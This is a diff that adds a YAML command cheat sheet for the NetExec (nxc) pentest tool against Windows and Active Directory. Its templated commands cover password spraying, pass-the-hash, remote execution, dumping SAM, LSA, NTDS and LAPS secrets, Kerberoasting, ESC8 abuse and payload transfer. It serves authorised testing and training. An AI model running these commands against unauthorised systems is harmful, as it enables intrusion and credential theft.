@@ -1,0 +1,1058 @@
+tool: nxc
+tags: [network, windows, active-directory, smb, ldap, authentication, enumeration, exploitation, pentest, red-team]
+
+actions:
+  # ============================================================================
+  # GETTING STARTED
+  # ============================================================================
+  
+  - title: nxc - show help and available protocols
+    desc: |
+      Display general help and list all available protocols. Shows SMB, SSH, LDAP,
+      FTP, WMI, WinRM, RDP, VNC, MSSQL, and NFS protocols.
+    command: "nxc --help"
+
+  - title: nxc - show protocol help
+    desc: |
+      Display help for a specific protocol. Shows all available options and
+      commands for the specified protocol.
+    command: "nxc {{protocol|smb}} --help"
+
+  - title: nxc - set thread count
+    desc: |
+      Set number of concurrent threads for scanning. Default is 100. Increase
+      for faster scanning on large networks, decrease for stealth.
+    command: "nxc {{protocol|smb}} {{target}} -u {{user}} -p {{pass}} -t {{threads|50}}"
+
+  - title: nxc - set timeout
+    desc: |
+      Set maximum timeout in seconds for each thread. Useful for slow networks
+      or when dealing with unresponsive hosts.
+    command: "nxc {{protocol|smb}} {{target}} --timeout {{timeout|30}}"
+
+  - title: nxc - add jitter/delay
+    desc: |
+      Add random delay between connections to avoid detection. Format: single value
+      or range (e.g., 2-5). Helps avoid rate limiting and detection.
+    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}}"
+
+  - title: nxc - verbose output
+    desc: |
+      Enable verbose output for detailed information. Shows more details about
+      connections, authentication attempts, and errors.
+    command: "nxc {{protocol|smb}} {{target}} --verbose"
+
+  - title: nxc - debug output
+    desc: |
+      Enable debug level output. Shows maximum detail including low-level protocol
+      information. Useful for troubleshooting.
+    command: "nxc {{protocol|smb}} {{target}} --debug"
+
+  - title: nxc - disable progress bar
+    desc: |
+      Disable progress bar display. Useful when redirecting output to files or
+      when running in automated scripts.
+    command: "nxc {{protocol|smb}} {{target}} --no-progress"
+
+  - title: nxc - show version
+    desc: |
+      Display nxc version information. Useful for checking installed version or
+      reporting issues.
+    command: "nxc --version"
+
+  # Target Formats
+  - title: nxc - scan single hostname
+    desc: |
+      Scan a single hostname. nxc will resolve the hostname to IP address
+      automatically.
+    command: "nxc {{protocol|smb}} {{hostname|dc01.example.com}}"
+
+  - title: nxc - scan single IP address
+    desc: |
+      Scan a single IP address. Most common target format for direct IP scanning.
+    command: "nxc {{protocol|smb}} {{ip|192.168.1.100}}"
+
+  - title: nxc - scan multiple IPs
+    desc: |
+      Scan multiple IP addresses separated by spaces. Efficient for scanning
+      a small number of specific targets.
+    command: "nxc {{protocol|smb}} {{ip1|192.168.1.100}} {{ip2|192.168.1.101}}"
+
+  - title: nxc - scan CIDR range
+    desc: |
+      Scan entire subnet using CIDR notation. Most efficient for scanning
+      entire network ranges (e.g., /24 subnet).
+    command: "nxc {{protocol|smb}} {{cidr|192.168.1.0/24}}"
+
+  - title: nxc - scan IP range
+    desc: |
+      Scan IP address range using dash notation. Useful for scanning specific
+      ranges without full subnet scanning.
+    command: "nxc {{protocol|smb}} {{range|192.168.1.0-28}}"
+
+  - title: nxc - scan from file
+    desc: |
+      Scan targets from a file (one target per line). Supports hostnames, IPs,
+      CIDR, and ranges. Most efficient for large target lists.
+    command: "nxc {{protocol|smb}} {{targets_file|~/targets.txt}}"
+
+  # Credentials
+  - title: nxc - authenticate with username and password
+    desc: |
+      Authenticate using username and password. Basic authentication method
+      supported by all protocols. Wrap passwords with special characters in quotes.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc - authenticate with password containing special chars
+    desc: |
+      Authenticate with password containing special characters. Wrap in single
+      quotes to prevent shell interpretation issues.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p '{{password|October2022!}}'"
+
+  - title: nxc - authenticate with NTLM hash
+    desc: |
+      Authenticate using NTLM hash instead of password. Useful for pass-the-hash
+      attacks. Format: LM:NT or just NT hash.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}}"
+
+  - title: nxc - authenticate with hash file
+    desc: |
+      Authenticate using hashes from a file (one hash per line). Enables
+      pass-the-hash attacks against multiple targets.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash_file|hashes.txt}}"
+
+  - title: nxc - authenticate with credential ID from database
+    desc: |
+      Use credentials from nxc database by credential ID. Automatically pulls
+      credentials from database, saves typing. Can specify multiple IDs.
+    command: "nxc {{protocol|smb}} {{target}} -id {{cred_id|1}}"
+
+  - title: nxc - authenticate with multiple credential IDs
+    desc: |
+      Use multiple credentials from database by IDs. Tests multiple credential
+      sets from database against targets.
+    command: "nxc {{protocol|smb}} {{target}} -id {{id1|1}} {{id2|2}}"
+
+  - title: nxc - multi-domain authentication
+    desc: |
+      Authenticate in multi-domain environment. File contains usernames in
+      DOMAIN\user format, one per line.
+    command: "nxc {{protocol|smb}} {{target}} -u {{domain_users_file}} -p {{password}}"
+
+  # Password Spraying & Brute Forcing
+  - title: nxc - password spray single password
+    desc: |
+      Password spray single password against multiple usernames. Tests one
+      password against multiple users. Watch for account lockouts!
+    command: "nxc {{protocol|smb}} {{target}} -u {{user1|user1}} {{user2|user2}} -p {{password|Summer18}}"
+
+  - title: nxc - password spray from username file
+    desc: |
+      Password spray against usernames from file. One username per line. Tests
+      single password against all users in file.
+    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc - brute force single user
+    desc: |
+      Brute force single username with multiple passwords. Tests multiple
+      passwords against one user. Can lock accounts!
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{pass1|pass1}} {{pass2|pass2}}"
+
+  - title: nxc - brute force from password file
+    desc: |
+      Brute force username with passwords from file. One password per line.
+      Tests all passwords against single user.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{passwords_file|~/passwords.txt}}"
+
+  - title: nxc - brute force with user and password files
+    desc: |
+      Brute force with both user and password files. Tests all combinations.
+      Result: user1=>pass1, user1=>pass2, user2=>pass1, etc. Very dangerous!
+    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}}"
+
+  - title: nxc - password spray without bruteforce
+    desc: |
+      Password spray without bruteforce (1:1 mapping). Each user gets matched
+      with corresponding password from file. user1=>pass1, user2=>pass2.
+    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
+
+  - title: nxc - password spray with continue on success
+    desc: |
+      Continue password spraying even after successful login. Useful for
+      spraying single password against large user list. Incompatible with
+      command execution.
+    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"
+
+  - title: nxc - check username equals password
+    desc: |
+      Check if username equals password using same file. Tests if users have
+      their username as password. Uses --no-bruteforce for 1:1 mapping.
+    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{users_file|~/users.txt}} --no-bruteforce --continue-on-success"
+
+  - title: nxc - password spray with jitter
+    desc: |
+      Password spray with jitter to throttle requests. Helps avoid account
+      lockouts and detection. Jitter works per-host basis.
+    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  # Kerberos
+  - title: nxc - authenticate with Kerberos (password)
+    desc: |
+      Authenticate using Kerberos with password. Automatically handles TGT/ST
+      ticket requests. Requires valid domain credentials.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -k"
+
+  - title: nxc - authenticate with Kerberos (hash)
+    desc: |
+      Authenticate using Kerberos with NTLM hash. Automatically handles TGT/ST
+      ticket requests. Useful for pass-the-hash with Kerberos.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}} -k"
+
+  - title: nxc - use existing Kerberos ticket
+    desc: |
+      Use existing Kerberos ticket from ccache file. Set KRB5CCNAME environment
+      variable to ticket file path. Useful when you already have valid tickets.
+    command: "export KRB5CCNAME={{ticket_file|/path/to/ticket.ccache}} && nxc {{protocol|smb}} {{target}} --use-kcache"
+
+  - title: nxc - use Kerberos with kdcHost
+    desc: |
+      Use Kerberos with explicit KDC host. Required when domain name resolution
+      fails or when specifying custom KDC server.
+    command: "nxc {{protocol|ldap}} {{target}} -u {{username}} -p {{password}} -k --kdcHost {{kdc_host|dc01.example.com}}"
+
+  # Modules
+  - title: nxc - list available modules
+    desc: |
+      List all available modules for a protocol. Shows module names and brief
+      descriptions. Essential for discovering module capabilities.
+    command: "nxc {{protocol|smb}} -L"
+
+  - title: nxc - run module
+    desc: |
+      Execute a module on target(s). Modules provide advanced functionality like
+      credential dumping, lateral movement, etc.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}}"
+
+  - title: nxc - show module options
+    desc: |
+      Display options for a specific module. Shows all configurable parameters
+      and their descriptions.
+    command: "nxc {{protocol|smb}} -M {{module_name|lsassy}} --options"
+
+  - title: nxc - run module with options
+    desc: |
+      Execute module with custom options. Options specified in KEY=value format
+      (msfvenom style). Multiple options separated by spaces.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}} -o {{option1|KEY1=value1}} {{option2|KEY2=value2}}"
+
+  - title: nxc - run multiple modules
+    desc: |
+      Execute multiple modules in sequence. Each module specified with -M flag.
+      Runs all specified modules against targets.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module1|spooler}} -M {{module2|iis}} -M {{module3|lsassy}}"
+
+  # Database
+  - title: nxc - access database shell
+    desc: |
+      Access nxc database shell (nxcdb). Interactive shell for querying and
+      managing stored credentials, hosts, shares, etc.
+    command: "nxcdb"
+
+  - title: nxc - create workspace
+    desc: |
+      Create new workspace in database. Workspaces separate different engagements
+      or pentests. All data stored per workspace.
+    command: "nxcdb > workspace create {{workspace_name|test}}"
+
+  - title: nxc - switch workspace
+    desc: |
+      Switch to different workspace. Changes active workspace for all operations.
+      All subsequent nxc commands use this workspace.
+    command: "nxcdb > workspace {{workspace_name|default}}"
+
+  - title: nxc - list workspaces
+    desc: |
+      List all available workspaces. Shows all created workspaces and indicates
+      current active workspace.
+    command: "nxcdb > workspace list"
+
+  - title: nxc - access protocol database
+    desc: |
+      Access specific protocol's database. Each protocol has its own database
+      with protocol-specific commands and data.
+    command: "nxcdb > proto {{protocol|smb}}"
+
+  - title: nxc - export credentials from database
+    desc: |
+      Export credentials from database to file. Supports simple or detailed
+      formats. Useful for sharing or backup.
+    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export creds {{format|detailed}} {{filename|creds.csv}}"
+
+  - title: nxc - export hosts from database
+    desc: |
+      Export hosts from database to file. Supports simple, detailed, or signing
+      formats. Signing format exports only IPs where SMB signing is enabled.
+    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export hosts {{format|detailed}} {{filename|hosts.csv}}"
+
+  # Logging
+  - title: nxc - log to file
+    desc: |
+      Log command output to file. Logs only current command output. Useful
+      for saving results of specific scans.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --log {{log_file|~/nxc.log}}"
+
+  # DNS Options
+  - title: nxc - set DNS server
+    desc: |
+      Manually set DNS server for name resolution. Useful when default DNS
+      doesn't resolve domain names correctly.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-server {{dns_server|8.8.8.8}}"
+
+  - title: nxc - set DNS timeout
+    desc: |
+      Set DNS resolution timeout in seconds. Increase for slow DNS servers
+      or unreliable networks.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-timeout {{timeout|5}}"
+
+  - title: nxc - use TCP for DNS
+    desc: |
+      Force TCP for DNS resolution instead of UDP. Useful when UDP DNS is
+      blocked or unreliable.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-tcp"
+
+  - title: nxc - enforce IPv6
+    desc: |
+      Force IPv6 for connections. Use when target only has IPv6 addresses
+      or when testing IPv6 connectivity.
+    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -6"
+
+  # ============================================================================
+  # SMB PROTOCOL
+  # ============================================================================
+
+  - title: nxc smb - basic authentication
+    desc: |
+      Authenticate to SMB share with username and password. Checks if credentials
+      are valid. Green output = success, Red = failure, Magenta = valid password
+      but authentication failed.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc smb - authenticate domain user
+    desc: |
+      Authenticate using domain account. Automatically detects domain from SMB
+      connection. Shows domain\username on success.
+    command: "nxc smb {{target}} -u {{domain|DOMAIN}}\\{{username}} -p {{password}}"
+
+  - title: nxc smb - authenticate local user
+    desc: |
+      Authenticate using local account. Use when target is not domain-joined or
+      for local account testing.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc smb - authenticate with hash
+    desc: |
+      Authenticate using NTLM hash (pass-the-hash). Format: LM:NT or just NT hash.
+      Useful when you have hashes but not plaintext passwords.
+    command: "nxc smb {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"
+
+  - title: nxc smb - password spray
+    desc: |
+      Password spray against SMB targets. Tests single password against multiple
+      users. Watch for account lockouts! Use --continue-on-success to continue
+      after finding valid credentials.
+    command: "nxc smb {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc smb - execute command
+    desc: |
+      Execute command on remote system via SMB. Requires admin privileges.
+      Shows (Pwn3d!) when code execution succeeds. Most likely local admin.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
+
+  - title: nxc smb - execute PowerShell command
+    desc: |
+      Execute PowerShell command on remote system. Use -X flag with PowerShell
+      commands. Useful for advanced Windows administration.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -X '{{ps_command|Get-Process}}'"
+
+  - title: nxc smb - get file from remote
+    desc: |
+      Download file from remote SMB share. Downloads file from remote path to
+      local path. Useful for extracting files from compromised systems.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|\\Windows\\Temp\\file.txt}} {{local_path|/tmp/file.txt}}"
+
+  - title: nxc smb - put file to remote
+    desc: |
+      Upload file to remote SMB share. Uploads local file to remote path.
+      Useful for transferring tools or payloads to compromised systems.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|\\Windows\\Temp\\file.txt}}"
+
+  - title: nxc smb - enumerate shares
+    desc: |
+      Enumerate SMB shares and access permissions. Lists all available shares
+      and shows which ones are accessible with current credentials.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --shares"
+
+  - title: nxc smb - spider shares
+    desc: |
+      Recursively spider SMB shares to find files. Discovers files and folders
+      in accessible shares. Useful for finding sensitive data.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --spider {{share|C$}} --spider-folder {{folder|Users}}"
+
+  - title: nxc smb - enumerate domain users
+    desc: |
+      Enumerate domain users via SMB. Lists all users in the domain. Requires
+      domain credentials.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --users"
+
+  - title: nxc smb - enumerate domain groups
+    desc: |
+      Enumerate domain groups via SMB. Lists all groups in the domain and their
+      members. Requires domain credentials.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --groups"
+
+  - title: nxc smb - enumerate logged on users
+    desc: |
+      Enumerate users currently logged on to target system. Shows active user
+      sessions. Useful for identifying high-value targets.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --loggedon-users"
+
+  - title: nxc smb - enumerate local groups
+    desc: |
+      Enumerate local groups on target system. Shows local group membership.
+      Useful for privilege escalation assessment.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --local-groups"
+
+  - title: nxc smb - enumerate sessions
+    desc: |
+      Enumerate active SMB sessions. Shows who is connected to SMB shares.
+      Useful for identifying active users.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --sessions"
+
+  - title: nxc smb - enumerate disks
+    desc: |
+      Enumerate disk drives on remote system. Shows available disk volumes
+      and their sizes. Useful for reconnaissance.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --disks"
+
+  - title: nxc smb - check SMB signing
+    desc: |
+      Check if SMB signing is required. Shows signing status for each host.
+      Unsigned SMB allows for relay attacks.
+    command: "nxc smb {{target}} --gen-relay-list {{output_file|targets.txt}}"
+
+  - title: nxc smb - scan for vulnerabilities
+    desc: |
+      Scan SMB targets for known vulnerabilities. Checks for common SMB
+      vulnerabilities and misconfigurations.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --vulns"
+
+  - title: nxc smb - dump LSA secrets
+    desc: |
+      Dump LSA secrets from remote system. Extracts cached credentials, service
+      account passwords, etc. Requires admin privileges.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M lsassy"
+
+  - title: nxc smb - dump SAM database
+    desc: |
+      Dump SAM database from remote system. Extracts local account password
+      hashes. Requires SYSTEM privileges.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M sam"
+
+  - title: nxc smb - dump DPAPI secrets
+    desc: |
+      Dump DPAPI secrets from remote system. Extracts encrypted credentials
+      stored by Windows applications. Requires user context.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M dpapi"
+
+  - title: nxc smb - dump NTDS.dit
+    desc: |
+      Dump NTDS.dit from domain controller. Extracts all domain account hashes.
+      Requires Domain Admin privileges and access to DC.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M ntds"
+
+  - title: nxc smb - check for null sessions
+    desc: |
+      Check for null session access. Tests if anonymous/null sessions are
+      allowed. Useful for enumeration without credentials.
+    command: "nxc smb {{target}} -u '' -p ''"
+
+  - title: nxc smb - generate hosts file
+    desc: |
+      Generate hosts file from discovered systems. Creates /etc/hosts format
+      file with hostname to IP mappings.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-hosts-file {{output_file|hosts.txt}}"
+
+  - title: nxc smb - generate krb5.conf
+    desc: |
+      Generate krb5.conf file for Kerberos. Creates Kerberos configuration
+      file with domain information.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-krb5-conf {{output_file|krb5.conf}}"
+
+  - title: nxc smb - generate TGT
+    desc: |
+      Generate Kerberos TGT ticket. Requests TGT from KDC and saves to ccache
+      file. Requires valid domain credentials.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-tgt {{output_file|ticket.ccache}}"
+
+  - title: nxc smb - change user password
+    desc: |
+      Change user password on remote system. Requires appropriate privileges
+      to change the target user's password.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} --change-password {{target_user}} {{new_password}}"
+
+  - title: nxc smb - impersonate logged on users
+    desc: |
+      Impersonate users currently logged on. Steals tokens from logged on
+      users for privilege escalation.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M impersonate"
+
+  - title: nxc smb - check for Print Spooler
+    desc: |
+      Check if Print Spooler service is running. Print Spooler can be abused
+      for privilege escalation (CVE-2021-1675).
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M spooler"
+
+  - title: nxc smb - check for WebDAV
+    desc: |
+      Check if WebDAV is running and accessible. WebDAV can be used for file
+      operations and potential exploitation.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M webdav"
+
+  - title: nxc smb - defeat LAPS
+    desc: |
+      Extract LAPS (Local Administrator Password Solution) passwords. Retrieves
+      managed local admin passwords from domain.
+    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M laps"
+
+  # ============================================================================
+  # LDAP PROTOCOL
+  # ============================================================================
+
+  - title: nxc ldap - basic authentication
+    desc: |
+      Authenticate to LDAP with username and password. Tests LDAP credentials.
+      Shows domain information on success.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc ldap - authenticate with hash
+    desc: |
+      Authenticate to LDAP using NTLM hash. Pass-the-hash authentication for
+      LDAP protocol.
+    command: "nxc ldap {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"
+
+  - title: nxc ldap - authenticate without SMB
+    desc: |
+      Authenticate to LDAP without initial SMB connection. Use --no-smb when
+      SMB port is closed or you want to skip SMB connection.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --no-smb"
+
+  - title: nxc ldap - enumerate users
+    desc: |
+      Enumerate all users in domain via LDAP. Lists all domain users with
+      their attributes. Requires domain credentials.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users"
+
+  - title: nxc ldap - enumerate active users
+    desc: |
+      Enumerate only active (enabled) users in domain. Filters out disabled
+      accounts. More efficient than full user enumeration.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --active-users"
+
+  - title: nxc ldap - export users to file
+    desc: |
+      Enumerate users and export to file. Saves user list to specified file
+      for further processing or analysis.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users-export {{output_file|users.txt}}"
+
+  - title: nxc ldap - enumerate group members
+    desc: |
+      Enumerate members of specific group. Lists all users in specified domain
+      group. Useful for finding privileged group members.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --group-members {{group_name|Domain Admins}}"
+
+  - title: nxc ldap - enumerate trusts
+    desc: |
+      Enumerate domain trusts. Lists all trust relationships with other domains.
+      Useful for cross-domain attack planning.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --trusts"
+
+  - title: nxc ldap - enumerate domain controllers
+    desc: |
+      Enumerate domain controllers. Lists all DCs in the domain with their
+      IP addresses and hostnames.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dc-list"
+
+  - title: nxc ldap - find domain SID
+    desc: |
+      Find domain SID (Security Identifier). Retrieves domain SID which is
+      needed for various attacks and enumeration.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --domain-sid"
+
+  - title: nxc ldap - ASREPRoast attack
+    desc: |
+      Perform ASREPRoast attack. Retrieves AS-REP hashes for users without
+      Kerberos pre-authentication. Can be done without credentials.
+    command: "nxc ldap {{target}} -u {{username|''}} -p {{password|''}} --asreproast {{output_file|asrep.txt}}"
+
+  - title: nxc ldap - ASREPRoast with user list
+    desc: |
+      ASREPRoast attack with user list. Tests multiple users for AS-REP
+      roastable accounts. No authentication required.
+    command: "nxc ldap {{target}} -u {{users_file|~/users.txt}} -p '' --asreproast {{output_file|asrep.txt}}"
+
+  - title: nxc ldap - ASREPRoast with authentication
+    desc: |
+      ASREPRoast attack with valid credentials. Enumerates all users and finds
+      AS-REP roastable accounts. More comprehensive than unauthenticated version.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --asreproast {{output_file|asrep.txt}}"
+
+  - title: nxc ldap - Kerberoasting attack
+    desc: |
+      Perform Kerberoasting attack. Retrieves TGS-REP hashes for service accounts.
+      Requires domain account or AS-REP roastable account.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --kerberoasting {{output_file|kerberoast.txt}}"
+
+  - title: nxc ldap - Kerberoasting via AS-REP
+    desc: |
+      Kerberoasting using AS-REP roastable account. Combines --no-preauth-targets
+      and --kerberoasting to perform Kerberoasting without pre-authentication.
+    command: "nxc ldap {{target}} -u {{asrep_user}} -p '' --no-preauth-targets {{targets_file|kerberoastable.list}} --kerberoasting {{output_file|kerberoast.txt}}"
+
+  - title: nxc ldap - check LDAP signing
+    desc: |
+      Check if LDAP signing is required. Unsigned LDAP allows for relay attacks.
+      Shows signing status for domain controllers.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --ldap-signing"
+
+  - title: nxc ldap - find unconstrained delegation
+    desc: |
+      Find accounts with unconstrained delegation. These accounts can be abused
+      for privilege escalation and credential theft.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --unconstrained-delegation"
+
+  - title: nxc ldap - find misconfigured delegation
+    desc: |
+      Find accounts with misconfigured constrained delegation. Constrained
+      delegation misconfigurations can be exploited for privilege escalation.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --find-delegation"
+
+  - title: nxc ldap - enumerate admin count
+    desc: |
+      Enumerate users with adminCount=1. These users have privileged access
+      and are high-value targets.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --admin-count"
+
+  - title: nxc ldap - dump GMSA accounts
+    desc: |
+      Dump Group Managed Service Account (GMSA) information. GMSA accounts
+      have managed passwords that can be extracted.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa"
+
+  - title: nxc ldap - extract GMSA secrets
+    desc: |
+      Extract GMSA account secrets. Retrieves password hashes for GMSA accounts
+      that can be used for authentication.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa-secrets"
+
+  - title: nxc ldap - enumerate machine account quota
+    desc: |
+      Check machine account quota. Shows how many computer accounts a user can
+      create. Useful for domain persistence.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --maq"
+
+  - title: nxc ldap - read DACL rights
+    desc: |
+      Read DACL (Discretionary Access Control List) rights. Shows permissions
+      on objects that might allow privilege escalation.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dacl"
+
+  - title: nxc ldap - get user descriptions
+    desc: |
+      Get user descriptions from LDAP. User descriptions sometimes contain
+      passwords or other sensitive information.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --user-descriptions"
+
+  - title: nxc ldap - extract subnet information
+    desc: |
+      Extract subnet information from AD. Lists all subnets defined in
+      Active Directory Sites and Services.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --subnets"
+
+  - title: nxc ldap - enumerate SCCM
+    desc: |
+      Enumerate SCCM (System Center Configuration Manager) information.
+      SCCM can be abused for lateral movement and code execution.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --sccm"
+
+  - title: nxc ldap - enumerate Entra ID
+    desc: |
+      Enumerate Entra ID (Azure AD) information. Shows Entra ID configuration
+      and hybrid setup information.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --entra-id"
+
+  - title: nxc ldap - query LDAP
+    desc: |
+      Execute custom LDAP query. Allows running arbitrary LDAP queries for
+      advanced enumeration and data extraction.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --query {{ldap_query|(objectClass=user)}}"
+
+  - title: nxc ldap - BloodHound ingestor
+    desc: |
+      Run BloodHound ingestor to collect AD data. Generates BloodHound-compatible
+      data files for graph analysis.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --bloodhound"
+
+  - title: nxc ldap - exploit ESC8 (ADCS)
+    desc: |
+      Exploit ESC8 vulnerability in Active Directory Certificate Services.
+      Allows for domain escalation through certificate abuse.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --esc8"
+
+  - title: nxc ldap - raise child domain
+    desc: |
+      Raise functional level of child domain. Advanced domain manipulation
+      requiring Domain Admin privileges.
+    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --raise-child"
+
+  # ============================================================================
+  # MSSQL PROTOCOL
+  # ============================================================================
+
+  - title: nxc mssql - authenticate Windows auth
+    desc: |
+      Authenticate to MSSQL using Windows authentication. Default authentication
+      method. Uses current user's Windows credentials or specified domain account.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}}"
+
+  - title: nxc mssql - authenticate Windows auth with domain
+    desc: |
+      Authenticate to MSSQL with Windows auth when SMB port is closed. Specify
+      domain explicitly with -d flag to avoid SMB connection.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
+
+  - title: nxc mssql - authenticate local auth
+    desc: |
+      Authenticate to MSSQL using SQL Server authentication (local auth).
+      Use --local-auth flag for SQL login instead of Windows login.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --local-auth"
+
+  - title: nxc mssql - specify custom port
+    desc: |
+      Connect to MSSQL on custom port. Default is 1433. Use --port for
+      non-standard ports.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --port {{port|1434}}"
+
+  - title: nxc mssql - execute SQL query
+    desc: |
+      Execute SQL query on MSSQL server. Runs specified SQL command and
+      displays results. Requires appropriate database permissions.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -q '{{sql_query|SELECT name FROM master.dbo.sysdatabases;}}'"
+
+  - title: nxc mssql - execute Windows command
+    desc: |
+      Execute Windows command via MSSQL xp_cmdshell. Requires xp_cmdshell to be
+      enabled and appropriate privileges. Shows (Pwn3d!) on success.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
+
+  - title: nxc mssql - password spray
+    desc: |
+      Password spray against MSSQL servers. Tests credentials against multiple
+      MSSQL instances. Use --no-bruteforce for 1:1 user:password mapping.
+    command: "nxc mssql {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
+
+  - title: nxc mssql - enumerate users by RID
+    desc: |
+      Enumerate users by brute forcing RIDs. Attempts to resolve SIDs to usernames
+      by trying different RID values. Useful for user enumeration.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --rid-brute"
+
+  - title: nxc mssql - privilege escalation
+    desc: |
+      Attempt MSSQL privilege escalation. Tries to escalate privileges through
+      various MSSQL misconfigurations and vulnerabilities.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --privesc"
+
+  - title: nxc mssql - upload file
+    desc: |
+      Upload file to MSSQL server. Transfers local file to remote system via
+      MSSQL. Useful for transferring tools or payloads.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --put-file {{local_file|/tmp/file.txt}} {{remote_path|C:\\temp\\file.txt}}"
+
+  - title: nxc mssql - download file
+    desc: |
+      Download file from MSSQL server. Retrieves remote file via MSSQL to
+      local system. Useful for data exfiltration.
+    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|C:\\temp\\file.txt}} {{local_file|/tmp/file.txt}}"
+
